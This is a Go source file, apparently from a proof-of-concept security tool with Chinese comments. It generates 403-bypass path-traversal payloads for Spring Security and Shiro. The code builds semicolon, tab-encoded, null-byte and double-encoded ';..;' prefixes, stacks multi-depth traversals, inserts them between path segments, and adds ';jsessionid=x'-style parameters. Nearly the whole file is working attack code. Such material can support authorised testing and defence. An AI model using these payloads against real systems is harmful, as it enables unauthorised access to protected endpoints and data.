package poc

import (
	"strings"
)

// SemiTabTraversal 生成 ;%09..;/ 模式的路径穿越 payload
// ref: 403权限绕过另类思路 — GET/;%09..;/path 模式
// 原理: 分号 + Tab编码 + 路径穿越组合，可绕过部分 Spring Security / Shiro 的路径规范化
func SemiTabTraversal(auth string) []string {
	var results []string

	// 基础 ;%09..;/ 穿越模式
	semiTabPrefixes := []string{
		"/;%09..;/",      // Tab encoded
		"/;%09%09..;/",   // Double Tab
		"/;%00..;/",      // Null byte
		"/;..;/",         // 经典 ;..;
		"/;%2e%2e;/",     // URL encoded dots
		"/;%252e%252e;/", // Double encoded dots
	}

	for _, prefix := range semiTabPrefixes {
		// 直接前置
		if strings.HasPrefix(auth, "/") {
			results = append(results, prefix+auth[1:])
		} else {
			results = append(results, prefix+auth)
		}
	}

	// 多层深度穿越: /;%09..;/;%09..;/path
	depths := []int{2, 3, 4, 6}
	for _, depth := range depths {
		var sb strings.Builder
		for i := 0; i < depth; i++ {
			sb.WriteString("/;%09..;")
		}
		sb.WriteString("/")
		if strings.HasPrefix(auth, "/") {
			sb.WriteString(auth[1:])
		} else {
			sb.WriteString(auth)
		}
		results = append(results, sb.String())
	}

	// 路径段间插入: /admin/;%09..;/api → 在 auth 路径的各段间插入
	parts := strings.Split(auth, "/")
	for insertIdx := 1; insertIdx < len(parts); insertIdx++ {
		for _, injection := range []string{";%09..;", ";..;", ";%09"} {
			var sb strings.Builder
			for i, part := range parts {
				if part == "" && i == 0 {
					continue
				}
				if i == insertIdx {
					sb.WriteString("/" + injection)
				}
				sb.WriteString("/" + part)
			}
			result := sb.String()
			result = strings.ReplaceAll(result, "//", "/")
			if result != auth {
				results = append(results, result)
			}
		}
	}

	// ;foo=bar 参数注入模式（ref: Shiro 绕过）
	paramInjections := []string{
		";a=1",
		";jsessionid=x",
		";foo=bar",
		";%09",
	}
	for _, param := range paramInjections {
		if strings.HasPrefix(auth, "/") {
			results = append(results, "/"+param+auth)
			results = append(results, auth+param)
			// 在最后一个路径段前插入
			lastSlash := strings.LastIndex(auth, "/")
			if lastSlash > 0 {
				results = append(results, auth[:lastSlash]+param+auth[lastSlash:])
			}
		}
	}

	return results
}
